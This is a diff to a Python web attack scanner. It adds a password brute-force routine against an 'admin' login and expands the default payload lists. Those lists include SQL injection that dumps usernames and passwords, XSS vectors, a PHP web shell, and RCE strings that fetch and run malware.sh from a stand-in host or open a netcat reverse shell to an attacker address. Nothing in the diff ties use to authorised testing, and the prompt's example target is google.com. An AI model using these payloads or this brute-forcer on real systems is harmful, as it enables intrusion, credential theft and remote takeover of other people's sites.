@@ -4,6 +4,7 @@ import re
 import urllib.parse
 import time
 from selenium import webdriver
+from tqdm import tqdm
 import os
 
 def display_name():
@@ -23,7 +24,6 @@ def display_name():
     
     print(name_art)
     print(tool_name)
-    print("Remember that when you start the program then auto open your browser to crawl the urls click any link you want or enter the link which is your target")
 
 display_name()
 
@@ -199,7 +199,10 @@ def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, w
     deep_links = deep_crawl_with_selenium(formatted_url)
     links.update(deep_links)
 
-    for link in links:
+    total_links = len(links)
+    print(f"Found {total_links} links. Starting scan...")
+
+    for i, link in enumerate(tqdm(links, desc="Scanning", unit="link")):
         print(f"Scanning {link} ...")
         analyze_headers(link)
         urls, usernames, vulnerabilities = form_analysis(link, sql_payloads, xss_payloads)
@@ -219,18 +222,50 @@ def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, w
         brute_force_login(formatted_url, 'username', 'password', wordlist)
 
 def get_default_payloads():
-    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #"]
-    xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
-    rce_payloads = ["'; echo RCE", "| nc -e /bin/sh attacker_ip attacker_port"]
-    fuzz_payloads = ["../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"]
-    
+    sql_payloads = [
+        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #",
+        "' UNION SELECT NULL, NULL --", "' UNION SELECT NULL, username, password FROM users --",
+        "' OR 1=1--", "' OR 'a'='a", "1' OR 'a'='a", "' OR '1'='1' /*", "' OR '1'='1' --",
+        "1' AND 1=1", "' AND 1=1", "' AND '1'='1"
+    ]
+    xss_payloads = [
+        "<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>",
+        "<img src='x' onerror='alert(1)'>", "<svg/onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>",
+        "<a href='javascript:alert(1)'>click me</a>"
+    ]
+    rce_payloads = [
+        "; ls", "; cat /etc/passwd", "; uname -a", "; id", "; whoami", "; wget http://malicious.com/malware.sh -O /tmp/malware.sh; sh /tmp/malware.sh",
+        "; nc -e /bin/sh attacker_ip attacker_port", "<?php system($_GET['cmd']); ?>"
+    ]
+    fuzz_payloads = [
+        "../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>", "<?php phpinfo(); ?>",
+        "<img src='x' onerror='alert(1)'>", "admin' --", "' OR 1=1 --", "' OR 'a'='a"
+    ]
     return sql_payloads, xss_payloads, rce_payloads, fuzz_payloads
+
+def brute_force_login(url, username_param, password_param, wordlist):
+    with open(wordlist, 'r') as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()
+        data = {
+            username_param: 'admin',
+            password_param: password
+        }
+
+        response = requests.post(url, data=data)
+        if "Login Successful" in response.text:
+            print(f"Login successful with password: {password}")
+            break
+        else:
+            print(f"Attempted with password: {password}")
 
 if __name__ == "__main__":
     website_url = input("Enter the website URL (e.g., https://google.com): ")
     wordlist_path = input("Enter the path to the wordlist for brute force (leave blank to skip): ")
-
-    sql_payloads_file = input("Enter path to SQL Injection payloads file (leave blank to use default): ")
+    
+    sql_payloads_file = input("Enter path to SQL payloads file (leave blank to use default): ")
     xss_payloads_file = input("Enter path to XSS payloads file (leave blank to use default): ")
     rce_payloads_file = input("Enter path to RCE payloads file (leave blank to use default): ")
     fuzz_payloads_file = input("Enter path to Fuzzing payloads file (leave blank to use default): ")
